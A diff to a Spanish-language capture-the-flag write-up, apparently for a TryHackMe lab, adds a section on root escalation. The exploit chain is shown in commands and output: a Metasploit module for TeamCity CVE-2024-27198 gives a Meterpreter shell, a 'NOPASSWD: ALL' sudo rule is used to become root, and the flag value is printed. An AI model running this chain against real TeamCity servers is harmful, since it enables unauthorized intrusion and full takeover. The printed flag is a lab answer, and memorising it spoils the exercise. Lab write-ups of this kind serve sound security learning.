@@ -241,7 +241,9 @@ msf exploit(multi/http/jetbrains_teamcity_rce_cve_2024_27198) > run
 meterpreter > 
 ```
 
-El exploit funciona tal como describía su documentación: crea un token de admin, sube un plugin (`r4FAhePm`) con el payload, y obtiene una sesión de `Meterpreter`. El módulo intenta limpiar el token y el plugin automáticamente, aún advierte de rutas que podrían requerir limpieza manual.
+El exploit funciona tal como describe su documentación: crea un token de admin, sube un plugin (`r4FAhePm`) con el payload, y obtiene una sesión de `Meterpreter`.
+
+El módulo intenta limpiar el token y el plugin automáticamente, aunque advierte de rutas que podrían requerir limpieza manual y podrían dejar rastro.
 
 Validamos el contexto de la sesión obtenida:
 
@@ -258,5 +260,75 @@ Meterpreter     : java/linux
 
 La sesión se obtiene con el usuario **ubuntu** y no con **root**.
 
-Confirmado también por la ruta `/home/ubuntu/.BuildServer/` vista en la salida del exploit, que indica que el servicio TeamCity corre bajo ese usuario. Será necesario un proceso de escalada de privilegios para alcanzar root.
+Confirmado también por la ruta `/home/ubuntu/.BuildServer/` como indica salida del exploit, que indica que el servicio **TeamCity** corre bajo ese usuario. 
+
+Será necesario un proceso de escalada de privilegios para alcanzar root.
+
+## Escalada de privilegios
+
+Desde la sesión de Meterpreter, abrimos una shell de sistema para enumerar permisos del usuario `ubuntu`:
+
+```bash
+meterpreter > shell
+Process 1 created.
+Channel 1 created.
+sudo -l 
+Matching Defaults entries for ubuntu on ip-10-129-145-75:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User ubuntu may run the following commands on ip-10-129-145-75:
+    (ALL : ALL) ALL
+    (ALL) NOPASSWD: ALL
+    (ALL) NOPASSWD: ALL
+```
+
+El usuario `ubuntu` tiene permiso `NOPASSWD: ALL`, puede ejecutar cualquier comando como **root** sin necesidad de contraseñavg
+
+Es la vía de escalada más directa posible, sin necesidad de buscar ningún SUID ni exploits de kernel.
+
+Aprovechamos este vector para obtener una shell de root:
+
+```bash
+whoami
+ubuntu
+sudo su
+whoami
+root
+```
+
+Confirmado: escalada de privilegios completada, sesión activa como **root** en el servidor.
+
+## CTF
+
+Listamos el directorio personal del usuario `ubuntu`:
+
+```bash
+meterpreter > pwd
+/home/ubuntu
+meterpreter > ls
+Listing: /home/ubuntu
+=====================
+
+Mode              Size  Type  Last modified              Name
+----              ----  ----  -------------              ----
+040777/rwxrwxrwx  4096  dir   2026-06-22 10:54:21 -0400  .BuildServer
+000667/rw-rw-rwx  0     fif   2026-06-22 10:53:26 -0400  .bash_history
+100667/rw-rw-rwx  220   fil   2020-02-25 07:03:22 -0500  .bash_logout
+100667/rw-rw-rwx  3771  fil   2020-02-25 07:03:22 -0500  .bashrc
+040777/rwxrwxrwx  4096  dir   2024-07-02 05:39:13 -0400  .cache
+040777/rwxrwxrwx  4096  dir   2024-08-02 04:54:40 -0400  .config
+040777/rwxrwxrwx  4096  dir   2024-07-02 05:40:18 -0400  .local
+100667/rw-rw-rwx  807   fil   2020-02-25 07:03:22 -0500  .profile
+100667/rw-rw-rwx  66    fil   2024-07-02 05:59:35 -0400  .selected_editor
+040777/rwxrwxrwx  4096  dir   2024-07-02 05:38:50 -0400  .ssh
+100667/rw-rw-rwx  0     fil   2024-07-02 05:39:21 -0400  .sudo_as_admin_successful
+100667/rw-rw-rwx  214   fil   2024-07-02 05:46:35 -0400  .wget-hsts
+100666/rw-rw-rw-  4829  fil   2024-07-02 10:55:04 -0400  config.log
+100666/rw-rw-rw-  38    fil   2024-07-02 06:05:47 -0400  flag.txt
+
+meterpreter > cat flag.txt 
+THM{faa9bac345709b6620a6200b484c7594}
+```
+
+`flag.txt` tenía permisos `rw-rw-rw-` (lectura para cualquier usuario del sistema), por lo que técnicamente no era necesario escalar a **root** para leerla. Me ha bastado con la shell inicial como `ubuntu` obtenida tras el RCE. No obstante, la escalada de privilegios sigue siendo una vulnerabilidad crítica real del servidor, ya que cualquier usuario con acceso a una shell (autenticado o vía RCE) puede convertirse en root sin contraseña gracias a la configuración `NOPASSWD: ALL` en `sudoers`.
 
